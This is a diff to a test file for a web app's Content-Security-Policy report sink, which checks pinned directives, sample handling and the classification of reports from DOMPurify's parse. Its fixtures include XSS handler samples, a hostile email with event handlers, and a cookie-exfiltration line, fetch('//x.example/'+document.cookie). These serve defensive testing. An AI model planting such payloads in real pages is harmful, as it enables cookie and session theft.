@@ -3,11 +3,23 @@
 // (the policy + a report as a line) and src/server/csp-reports.js (POST /api/csp-report → data/csp-reports.jsonl + one
 // For-you notice per new pair). Fast tier: express on 127.0.0.1, the real sink on a scratch dir, server.js's OWN index
 // route and sink line run verbatim (read off server.js), the real Auth's sign-in page.
-//   ① the policy: every directive pinned (default-src 'self', script-src 'self' with no inline / eval, object-src 'none',
+//   ① the policy: every directive pinned (default-src 'self', script-src 'self' with no inline / eval + 'report-sample' —
+//      it allows nothing; a report carries the first 40 characters of the code it names (lane chrome-156-drift) —, object-src 'none',
 //      base-uri 'self', frame-ancestors 'self', report-uri, no report-to) — MUTANT: object-src dropped ⇒ RED
 //   ② a report as a line: no value (no sample, no query, no fragment), a URL cut to origin + 3 segments, the Reporting-API
 //      shape too, an unknown directive dropped; a kept segment that looks like a token cut to `<token>` (B-a35f, q-043 verify
-//      L4 — MUTANT: the cut dropped ⇒ RED); ③b over the route, the stored line and the For-you notice hold `<token>`
+//      L4 — MUTANT: the cut dropped ⇒ RED); ③b over the route, the stored line and the For-you notice hold `<token>`;
+//      ②b/③c (lane chrome-156-drift) the ONE exception: a script-src report's sample is kept only when asked for — a chrome
+//      suite's sink (handed the suite's file) keeps it, ≤ 40 characters; a hub's own data/ never; ⑥b the teardown's words
+//      (cspWhat) name the sample and say a line with no source is the SUITE's own evaluated code
+//   ③d THE SANITIZER'S PARSE IS NOT A GAP (lane chrome-156-followups): Chrome 156 reports a handler DOMPurify's inert parse
+//      set and dropped — the release build and the chrome suites' build rebuilt in memory, EVERY parseFromString call in each
+//      named by the bundle's symbol map (scripts/symbolicate.mjs lookupMany): purifyParseSites finds exactly DOMPurify's
+//      (MUTANT: the signature cut to the call ⇒ the docx viewer's too, RED); a hostile .md's and an agent's markdown's
+//      reports there ⇒ ONE `sanitizer-parse` line, its own count, NO notice; the CONTROL — the same attribute set by our own
+//      code (file-viewer's innerHTML) — a line and the notice; no sample / another origin / another script / another build /
+//      no bundle ⇒ what a report always was; a hostile MAIL never reaches the parse with a handler (mail-frame step 1);
+//      ⑥c a suite's sanitizer line is printed, never a failure
 //   ③ the route: a fake report lands as ONE line; the duplicate is still one line + ONE notice; the same pair on another
 //      line is a second line and no second notice; a restart re-writes and re-notices nothing; a report from a FRAME the
 //      page made (document about / blob / data) is a line and NO notice (主开发's ruling 2) — the count tells them apart
@@ -43,7 +55,7 @@ import path from 'node:path';
 import http from 'node:http';
 import Module, { createRequire } from 'node:module';
 import { spawnSync } from 'node:child_process';
-import { scratch } from './scratch.mjs';
+import { scratch, cspWhat, cspSanitizerLine } from './scratch.mjs';
 const require = createRequire(import.meta.url);
 const REPO = path.resolve(new URL('..', import.meta.url).pathname);
 const express = require(path.join(REPO, 'node_modules/express'));
@@ -61,7 +73,7 @@ const readRepo = (f) => fs.readFileSync(path.join(REPO, f), 'utf8');
 // ── ① THE POLICY ──
 console.log('① the policy — every directive pinned');
 const PINS = [   // THE MEASURED POLICY, every directive (the lane's report says what each source is for) — a change moves a pin here
-  ['default-src', ["'self'"]], ['script-src', ["'self'"]], ['style-src', ["'self'", "'unsafe-inline'"]],
+  ['default-src', ["'self'"]], ['script-src', ["'self'", "'report-sample'"]], ['style-src', ["'self'", "'unsafe-inline'"]],
   ['img-src', ["'self'", 'data:', 'blob:', 'https:']], ['font-src', ["'self'", 'blob:']], ['connect-src', ["'self'", 'blob:']],
   ['media-src', ["'self'", 'blob:']], ['worker-src', ["'self'"]], ['frame-src', ["'self'", 'blob:', 'http:', 'https:']],
   ['object-src', ["'none'"]], ['base-uri', ["'self'"]], ['form-action', ["'self'"]], ['frame-ancestors', ["'self'"]],
@@ -119,6 +131,19 @@ const report = (o = {}) => ({ 'csp-report': { 'document-uri': `http://127.0.0.1:
   ok(C.reportsOf('not json').length === 0 && C.reportsOf('{}').length === 0 && C.reportsOf(JSON.stringify(Array(50).fill({ type: 'csp-violation', body: { effectiveDirective: 'img-src', blockedURL: 'data' } }))).length === 20, 'not JSON / no report ⇒ nothing; at most 20 reports a post');
 }
 
+// ── ②b THE ONE EXCEPTION: A SAMPLE, ONLY WHEN ASKED (lane chrome-156-drift) ──
+console.log('②b a script-src report\'s sample — kept only when asked for (a chrome suite\'s hub), ≤ 40 characters, script-src only');
+{
+  const attr = report({ 'effective-directive': 'script-src-attr', 'violated-directive': 'script-src-attr', 'blocked-uri': 'inline', 'source-file': '', 'line-number': 1, 'column-number': 101, 'script-sample': 'window.__xss=1' + 'x'.repeat(60) });
+  const [plain] = C.reportsOf(JSON.stringify(attr)), [asked] = C.reportsOf(JSON.stringify(attr), { sample: true });
+  ok(plain && !('sample' in plain) && asked && asked.sample === ('window.__xss=1' + 'x'.repeat(60)).slice(0, C.SAMPLE_MAX) && C.SAMPLE_MAX === 40 && asked.line === 1 && asked.column === 101 && asked.source === '', 'a script-src-attr report: no sample by default; asked for, the handler\'s first 40 characters (the browser\'s own cut) beside its position', { plain, asked });
+  const [img] = C.reportsOf(JSON.stringify(report()), { sample: true });
+  ok(img && !('sample' in img) && !JSON.stringify(img).includes(SECRET), 'an img-src report never carries a sample, asked or not (only code is sampled)', img);
+  const api = C.reportsOf(JSON.stringify([{ type: 'csp-violation', body: { effectiveDirective: 'script-src-elem', blockedURL: 'inline', sourceFile: '', lineNumber: 1, documentURL: 'http://h/', disposition: 'report', sample: 'alert(1)' } }]), { sample: true });
+  ok(api.length === 1 && api[0].sample === 'alert(1)', 'the Reporting-API shape names its sample `sample` — read the same way', api);
+  ok(C.lineKey({ ...asked, sample: 'a()' }) !== C.lineKey({ ...asked, sample: 'b()' }) && C.lineKey(plain) === C.lineKey({ ...asked, sample: undefined }), 'two handlers at one position are two lines in a suite\'s file; a line without a sample keys as it always did');
+}
+
 // ── ③ THE ROUTE ──
 console.log('③ the route — one line per report key, one notice per pair');
 function hub({ dir, ...o } = {}) {
@@ -165,6 +190,152 @@ const FILE1 = path.join(D1, SINK.FILE);
   await post(H2, report()); await post(H2, report({ 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' }));
   ok(linesOf(FILE1).length === 5 && H2.added.length === 0 && H2.sink.summary().app.lines === 3 && H2.sink.summary().frames.lines === 2, 'a RESTART reads the keys on disk: the same reports write nothing and file nothing; the count of lines is read back', { lines: linesOf(FILE1).length, notices: H2.added.length, sum: H2.sink.summary() });
   await H2.close();
+}
+
+// ── ③c A CHROME SUITE'S SINK KEEPS THE SAMPLE; A HUB'S OWN NEVER (lane chrome-156-drift) ──
+console.log('③c a sink handed a suite\'s file keeps a script-src report\'s sample; the same post to a hub\'s own data/ keeps none');
+{
+  const DS = path.join(ROOT, 'suite', 'data'), DO = path.join(ROOT, 'own', 'data'); fs.mkdirSync(DS, { recursive: true }); fs.mkdirSync(DO, { recursive: true });
+  const SUITE_FILE = path.join(ROOT, 'suite', 'csp-reports.jsonl');
+  const HS = await hub({ dir: DS, file: SUITE_FILE }), HO = await hub({ dir: DO });
+  const attr = report({ 'effective-directive': 'script-src-attr', 'violated-directive': 'script-src-attr', 'blocked-uri': 'inline', 'source-file': '', 'line-number': 1, 'column-number': 101, 'script-sample': 'window.__xss=1' });
+  const a = await post(HS, attr), b = await post(HO, attr);
+  const ls = linesOf(SUITE_FILE), lo = linesOf(path.join(DO, SINK.FILE));
+  ok(a.status === 204 && ls.length === 1 && ls[0].sample === 'window.__xss=1' && ls[0].column === 101, 'a chrome suite\'s sink (an explicit file — VIBESPACE_CSP_REPORTS_FILE) keeps the handler\'s sample: the teardown can say WHAT was reported', ls);
+  ok(b.status === 204 && lo.length === 1 && !('sample' in lo[0]) && !fs.readFileSync(path.join(DO, SINK.FILE), 'utf8').includes('__xss'), 'the same post to a hub\'s own data/csp-reports.jsonl keeps none (never a value in the hub\'s file)', lo);
+  await HS.close(); await HO.close();
+}
+
+// ── ③d THE SANITIZER'S PARSE IS NOT A GAP (lane chrome-156-followups) ──
+// Chrome 156 reports an inline handler when its attribute is SET — DOMPurify's inert DOMParser parse of a hostile .md
+// (test-channel-window-render ⑭, measured: «window.__pwned=14», bundle.js 127564:35 on the suites' build) sets the one it
+// drops. The collector names such a report `sanitizer-parse` by the BUNDLE'S CODE at the browser's position — pinned here
+// on the bundle's symbol map (scripts/symbolicate.mjs), for the release build (package.json's step) and the chrome
+// suites' build, never on a column alone.
+console.log('③d a handler the sanitizer\'s inert parse set and dropped is `sanitizer-parse` — its own count, never a notice; pinned on the bundle\'s symbol map');
+{
+  const SYM = await import(path.join(REPO, 'scripts/symbolicate.mjs'));
+  const esbuild = require(path.join(REPO, 'node_modules/esbuild'));
+  const MF = require(path.join(REPO, 'src/mail-frame.js'));
+  const rel = SYM.clientBuildOptions(JSON.parse(readRepo('package.json')));
+  // the chrome suites' build: the release step without --minify — read off a suite that builds it
+  const suiteStep = (/execSync\('npx esbuild (src\/client\.js [^']+)'/.exec(readRepo('scripts/test-channel-window-render.mjs')) || [])[1];
+  const suiteFlags = suiteStep ? suiteStep.split(/\s+/).slice(1).sort() : null;
+  ok(JSON.stringify(suiteFlags) === JSON.stringify(SYM.flagsOf({ ...rel, minify: false })), 'the chrome suites build the client with package.json\'s step minus --minify (read off test-channel-window-render) — the two builds pinned below', suiteFlags);
+  /** [line, column] (1-based, V8's line terminators) of every index in `at` */
+  const posOf = (js, at) => { const out = []; let line = 1, start = 0; const re = /\r\n?|[\n\u2028\u2029]/g; for (const p of at) { re.lastIndex = start; for (let m = re.exec(js); m && m.index < p; m = re.exec(js)) { line++; start = m.index + m[0].length; } out.push([line, p - start + 1]); } return out; };
+  const allAt = (js, needle, skip = 0) => { const a = []; for (let i = js.indexOf(needle); i >= 0; i = js.indexOf(needle, i + 1)) a.push(i + skip); return a; };
+  const builds = {};
+  for (const [name, o] of [['release', rel], ['suites', { ...rel, minify: false }]]) {
+    const r = await esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, write: false, logLevel: 'silent' });
+    const js = Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.js')).contents).toString('utf8');
+    const map = JSON.parse(Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.map')).contents).toString('utf8'));
+    // EVERY parseFromString call in the bundle, by its text — and what the bundle's symbol map says each one is
+    const calls = posOf(js, allAt(js, '.parseFromString(', 1));
+    const said = SYM.lookupMany(map, calls);
+    const is = ([l, c]) => said.get(`${l}:${c}`);
+    const purify = calls.filter((p) => is(p) && /node_modules\/dompurify\//.test(is(p).source) && is(p).name === 'parseFromString');
+    const sites = C.purifyParseSites(js);
+    const others = calls.filter((p) => !purify.includes(p)).map((p) => `${(is(p) || {}).source || '?'}`.replace(/^(\.\.\/)+/, ''));
+    ok(calls.length >= 2 && purify.length === 1 && JSON.stringify(sites) === JSON.stringify(purify), `${name} build: the symbol map names ONE of the bundle's ${calls.length} parseFromString calls DOMPurify's (${is(purify[0] || [0, 0]) ? is(purify[0]).source.replace(/^(\.\.\/)+/, '') + ':' + is(purify[0]).line : '?'}) and purifyParseSites finds exactly it, at ${JSON.stringify(sites)} — never ${others.join(', ')}`, { calls, purify, sites, others });
+    // an app-code position that writes HTML into the live page: file-viewer's markdown (what a handler set by OUR code would be reported at)
+    const writes = posOf(js, allAt(js, '.innerHTML', 1));
+    const own = SYM.lookupMany(map, writes);
+    const appWrite = writes.find(([l, c]) => { const p = own.get(`${l}:${c}`); return p && /src\/lib\/file-viewer\.js$/.test(p.source); });
+    builds[name] = { js, site: sites[0], appWrite };
+  }
+  ok(builds.suites.site && builds.suites.site[1] === 35 && /^ +doc\d* = new DOMParser\d*\(\)\.$/.test(builds.suites.js.split('\n')[builds.suites.site[0] - 1].slice(0, 34)), 'the suites\' build spells the parse as Chrome 156 named it on the runner (bundle.js L:35 — measured 127564:35, the `parseFromString` of `doc = new DOMParser().parseFromString(…)`)', builds.suites.site);
+  {
+    const src = readRepo('src/app-csp.js');
+    const sig = /^const PURIFY_PARSE = \/.*\/;$/m;
+    ok(sig.test(src), 'the mutant anchor (the parse signature, PURIFY_PARSE) is in src/app-csp.js');
+    const M = load(path.join(REPO, 'src/app-csp.js'), src.replace(sig, 'const PURIFY_PARSE = /^parseFromString\\(/;'));
+    const loose = M.purifyParseSites(builds.release.js);
+    ok(loose.length > 1, `MUTANT (the signature cut to the call alone) ⇒ RED: ${loose.length} sites — the docx viewer's parse would be called the sanitizer's`, loose);
+  }
+  // THE REPORTS — the shape Chrome 156 posts (report-uri, application/csp-report), at the build the page loaded
+  const PUB = path.join(ROOT, 'sanitizer', 'public'); fs.mkdirSync(PUB, { recursive: true });
+  const BUNDLE = path.join(PUB, 'bundle.js');
+  fs.writeFileSync(BUNDLE, builds.suites.js);
+  const V = String(Math.floor(fs.statSync(BUNDLE).mtimeMs));
+  const ORIGIN = 'http://127.0.0.1:1';
+  const handler = (sample, [line, column], o = {}) => ({ 'csp-report': { 'document-uri': `${ORIGIN}/`, referrer: '', 'violated-directive': 'script-src-attr', 'effective-directive': 'script-src-attr', 'original-policy': POLICY, disposition: 'report', 'blocked-uri': 'inline', 'line-number': line, 'column-number': column, 'source-file': `${ORIGIN}/bundle.js?v=${V}`, 'status-code': 200, 'script-sample': sample, ...o } });
+  const MD = handler('window.__pwned=14', builds.suites.site);                 // a peer's hostile .md (⑭ — the measured report)
+  const CHAT = handler('fetch(\'//x.example/\'+document.cookie)', builds.suites.site); // an agent's markdown in the chat — the same one parse
+  const CONTROL = handler('window.__pwned=14', builds.suites.appWrite);        // the SAME attribute set by OUR code (file-viewer's innerHTML)
+  const [md] = C.reportsOf(JSON.stringify(MD), { site: true }), [ctl] = C.reportsOf(JSON.stringify(CONTROL), { site: true });
+  ok(md && md.site && md.site.v === V && md.site.line === builds.suites.site[0] && md.site.column === builds.suites.site[1] && !('sample' in md) && ctl && ctl.site, 'reportOf(…, { site: true }) keeps WHERE a candidate was set (the build, line, column — numbers) and still no sample', md);
+  const siteless = [
+    ['no sample (not a handler\'s code)', handler('', builds.suites.site)],
+    ['another origin\'s bundle.js', handler('window.__pwned=14', builds.suites.site, { 'source-file': `http://evil.example/bundle.js?v=${V}` })],
+    ['another script of this origin', handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/design-viewer.js?v=${V}` })],
+    ['an inline script (script-src-elem)', handler('window.__pwned=14', builds.suites.site, { 'effective-directive': 'script-src-elem', 'violated-directive': 'script-src-elem' })],
+    ['a frame the page made (document about)', handler('window.__pwned=14', builds.suites.site, { 'document-uri': 'about' })],
+  ];
+  for (const [why, r] of siteless) { const [x] = C.reportsOf(JSON.stringify(r), { site: true }); ok(x && !x.site, `not a candidate: ${why}`, x); }
+  // a MAIL: its body reaches the frame's DOMPurify only through mail-frame step 1, the allowlist re-serializer — no handler
+  // survives it, so the mail frame's parse never sets one (measured: 0 reports on Chrome 156); were one to reach it, it is
+  // the same parse site (ONE DOMPurify in the bundle — the symbol map above), so the same kind
+  const HOSTILE_MAIL = '<p>Invoice</p><img src=x onerror="window.__mail=1"><a href="https://x.example/" onclick="window.__mail=2">pay</a><div ONMOUSEOVER=window.__mail=3>y</div><svg onload=window.__mail=4></svg>';
+  const step1 = MF.sanitizeMailHtml(HOSTILE_MAIL, {});
+  ok(step1.ok && !/\son[a-z]+\s*=/i.test(step1.html) && !step1.html.includes('__mail'), 'a hostile MAIL: mail-frame step 1 drops every handler before DOMPurify ever parses it (no report can come from the mail frame)', step1.html);
+  // THROUGH THE SINK: a hub's own data/ (no sample kept — the kind is judged, the sample never written) and a suite's file
+  const DH = path.join(ROOT, 'sanitizer', 'hub', 'data'); fs.mkdirSync(DH, { recursive: true });
+  const FH = path.join(DH, SINK.FILE);
+  {
+    const H = await hub({ dir: DH, bundle: BUNDLE });
+    const a = await post(H, MD);
+    const l1 = linesOf(FH);
+    ok(a.status === 204 && l1.length === 1 && l1[0].kind === C.KIND_SANITIZER && !('site' in l1[0]) && !('sample' in l1[0]) && !fs.readFileSync(FH, 'utf8').includes('__pwned') && H.added.length === 0, 'the hostile .md\'s report (the sanitizer\'s parse) ⇒ ONE line of kind `sanitizer-parse` and NO For-you notice; the sample judged it and was never written', { l1, notices: H.added });
+    await post(H, CHAT);
+    ok(linesOf(FH).length === 1 && H.added.length === 0, 'an agent\'s hostile markdown in the chat — the same parse, another handler ⇒ the same line (a hub keeps no sample), still no notice', linesOf(FH));
+    const sum1 = H.sink.summary();
+    ok(sum1.sanitizer.lines === 1 && sum1.sanitizer.reports === 2 && sum1.app.lines === 0 && sum1.app.reports === 0 && sum1.noticed === 0, 'the count: the sanitizer\'s own (1 line, 2 reports) — never the app page\'s, the count that says whether the policy is complete', sum1);
+    const c = await post(H, CONTROL);
+    const l2 = linesOf(FH);
+    ok(c.status === 204 && l2.length === 2 && !l2[1].kind && l2[1].noticed === true && H.added.length === 1 && /would block script-src-attr: inline/.test(H.added[0].text), 'CONTROL: the same attribute set by OUR code (file-viewer\'s innerHTML, the same sample) ⇒ a line of the app page and its ONE For-you notice', { l2, notices: H.added.map((x) => x.text) });
+    const st = H.sink.stats();
+    ok(st.sanitizer === 2 && H.sink.summary().app.lines === 1, 'stats: two reports judged the sanitizer\'s; the control counts on the app page', st);
+    await H.close();
+    const H2 = await hub({ dir: DH, bundle: BUNDLE });
+    const s2 = H2.sink.summary();
+    ok(s2.sanitizer.lines === 1 && s2.app.lines === 1 && H2.added.length === 0, 'a RESTART reads each line\'s kind back: 1 sanitizer line, 1 app line', s2);
+    await H2.close();
+  }
+  {
+    const DB = path.join(ROOT, 'sanitizer', 'build', 'data'); fs.mkdirSync(DB, { recursive: true });
+    const H = await hub({ dir: DB, bundle: BUNDLE });
+    await post(H, handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/bundle.js?v=1` }));
+    const l = linesOf(path.join(DB, SINK.FILE));
+    ok(l.length === 1 && !l[0].kind && H.added.length === 1 && H.sink.stats().otherBuild === 1, 'a page on ANOTHER build (its ?v= is not the bundle on disk) is not read — the report keeps its notice', { l, st: H.sink.stats() });
+    await H.close();
+    const DN = path.join(ROOT, 'sanitizer', 'nobundle', 'data'); fs.mkdirSync(DN, { recursive: true });
+    const HN = await hub({ dir: DN, bundle: path.join(ROOT, 'sanitizer', 'none.js') });
+    await post(HN, MD);
+    ok(linesOf(path.join(DN, SINK.FILE)).length === 1 && HN.added.length === 1, 'no bundle on disk ⇒ the report is what it always was (a line + its notice)', HN.added);
+    await HN.close();
+  }
+  {
+    const DS = path.join(ROOT, 'sanitizer', 'suite', 'data'); fs.mkdirSync(DS, { recursive: true });
+    const SF = path.join(ROOT, 'sanitizer', 'suite', 'csp-reports.jsonl');
+    const H = await hub({ dir: DS, file: SF, bundle: BUNDLE });
+    await post(H, MD);
+    const l = linesOf(SF);
+    ok(l.length === 1 && l[0].kind === C.KIND_SANITIZER && l[0].sample === 'window.__pwned=14' && H.added.length === 0, 'a chrome suite\'s file: the line keeps its sample AND its kind (the teardown prints it, never fails on it — ⑥c)', l);
+    await H.close();
+  }
+  // the release build on disk (what a hub serves): the site there is the release's own
+  {
+    fs.writeFileSync(BUNDLE, builds.release.js);
+    const V2 = String(Math.floor(fs.statSync(BUNDLE).mtimeMs));
+    const DR = path.join(ROOT, 'sanitizer', 'release', 'data'); fs.mkdirSync(DR, { recursive: true });
+    const H = await hub({ dir: DR, bundle: BUNDLE });
+    await post(H, handler('window.__pwned=14', builds.release.site, { 'source-file': `${ORIGIN}/bundle.js?v=${V2}` }));
+    await post(H, handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/bundle.js?v=${V2}` }));
+    const l = linesOf(path.join(DR, SINK.FILE));
+    ok(l.length === 2 && l[0].kind === C.KIND_SANITIZER && !l[1].kind && H.added.length === 1, `the release build (${builds.release.site.join(':')}): its own parse site is the sanitizer's; the suites' position on it is not (a notice)`, l);
+    await H.close();
+  }
 }
 
 // ── ③b A TOKEN IN A PATH SEGMENT (B-a35f, q-043 verify L4) ──
@@ -306,6 +477,40 @@ console.log('⑥ the chrome suites\' teardown — a report at the end of a suite
   fs.writeFileSync(mut, src.replace(cut, "if (CSP_REPORTS_FILE) { process.env[CSP_REPORTS_ENV] = CSP_REPORTS_FILE; }").replace(/from '\.\//g, `from '${path.join(REPO, 'scripts')}/`).replace(/require\('\.\.\//g, `require('${REPO}/`));
   const m = child('test-csp-child-mutant.mjs', mut, true);
   ok(m.rc === 0, 'MUTANT (the exit check cut) ⇒ RED: the reported suite passes', m);
+}
+
+// ── ⑥b THE TEARDOWN SAYS WHAT WAS REPORTED (lane chrome-156-drift) ──
+console.log('⑥b the teardown\'s words: the sample, where the code ran, the Chrome 156 handler rule');
+{
+  const runner = { at: 'x', directive: 'script-src-attr', blocked: 'inline', source: '', line: 1, column: 101, document: 'http://127.0.0.1:1/', disposition: 'report', sample: 'window.__xss=1' };
+  const w = cspWhat(JSON.stringify(runner));
+  ok(w.includes('«window.__xss=1»') && /NO URL at 1:101/.test(w) && /SUITE evaluated over CDP/.test(w) && /Chrome 156/.test(w) && /blank tab/.test(w), 'the runner\'s line (script-src-attr inline, no source, 1:101) now reads: the handler «window.__xss=1», code with NO URL = the suite\'s own Runtime.evaluate, the Chrome 156 rule and where a markup control belongs', w);
+  const bundle = cspWhat({ ...runner, source: 'http://127.0.0.1:1/dist/app.js', line: 2, column: 18545, sample: undefined });
+  ok(/code in http:\/\/127\.0\.0\.1:1\/dist\/app\.js at 2:18545/.test(bundle) && /no sample/.test(bundle), 'a line from the bundle names the file and position, and says when no sample was kept', bundle);
+  ok(/^img-src https:\/\/cdn\.example\.net\/a — https:\/\/cdn\.example\.net\/a,/.test(cspWhat({ directive: 'img-src', blocked: 'https://cdn.example.net/a', source: '', line: null, column: null, document: 'about' })) && cspWhat('not json') === 'an unreadable line', 'a non-script line names what was blocked; an unreadable line says so');
+}
+
+// ── ⑥c A SANITIZER LINE IS PRINTED, NEVER A FAILURE (lane chrome-156-followups) ──
+console.log('⑥c the teardown: a line of the sanitizer\'s parse is printed and the suite passes; any other line still fails it');
+{
+  const dir = path.join(ROOT, 'suite6c'); fs.mkdirSync(dir, { recursive: true });
+  const SCR = path.join(REPO, 'scripts', 'scratch.mjs');
+  const LINE = { at: 'x', directive: 'script-src-attr', blocked: 'inline', source: 'http://127.0.0.1:1/bundle.js', line: 127564, column: 35, document: 'http://127.0.0.1:1/', disposition: 'report', sample: 'window.__pwned=14', kind: C.KIND_SANITIZER };
+  const child = (name, lines) => {
+    const f = path.join(dir, name);
+    fs.writeFileSync(f, `const S = await import(${JSON.stringify(SCR)});\n`
+      + `const file = process.env[S.CSP_REPORTS_ENV];\n`
+      + `const fs = await import('node:fs'); const path = await import('node:path'); fs.mkdirSync(path.dirname(file), { recursive: true });\n`
+      + `for (const l of ${JSON.stringify(lines)}) fs.appendFileSync(file, JSON.stringify(l) + '\\n');\n`
+      + `console.log('ALL PASS (1)'); process.exit(0);\n`);
+    const r = spawnSync(process.execPath, [f], { encoding: 'utf8', env: { ...process.env, VIBESPACE_CSP_REPORTS_FILE: '' } });
+    return { rc: r.status, out: r.stdout + r.stderr };
+  };
+  const only = child('test-csp-child-sanitizer.mjs', [LINE]);
+  ok(only.rc === 0 && /CSP: 1 line\(s\) of the sanitizer's parse — not a gap in the policy/.test(only.out) && /«window\.__pwned=14»/.test(only.out) && /SANITIZER's parse/.test(only.out), 'a suite whose file holds ONLY a sanitizer-parse line ⇒ exit 0, the line printed with its words', only);
+  const both = child('test-csp-child-sanitizer-red.mjs', [LINE, { ...LINE, kind: undefined, line: 9, sample: 'window.__x=1' }]);
+  ok(both.rc === 1 && /CSP: the app page reported 1 thing/.test(both.out), '…and one more line WITHOUT the kind ⇒ exit 1, that one counted (the policy is complete only when nothing else was reported)', both);
+  ok(cspSanitizerLine(JSON.stringify(LINE)) && !cspSanitizerLine(JSON.stringify({ ...LINE, kind: undefined })) && !cspSanitizerLine('not json'), 'cspSanitizerLine: the kind, read off the line');
 }
 
 // ── ⑦ THE FRAME HOST ──
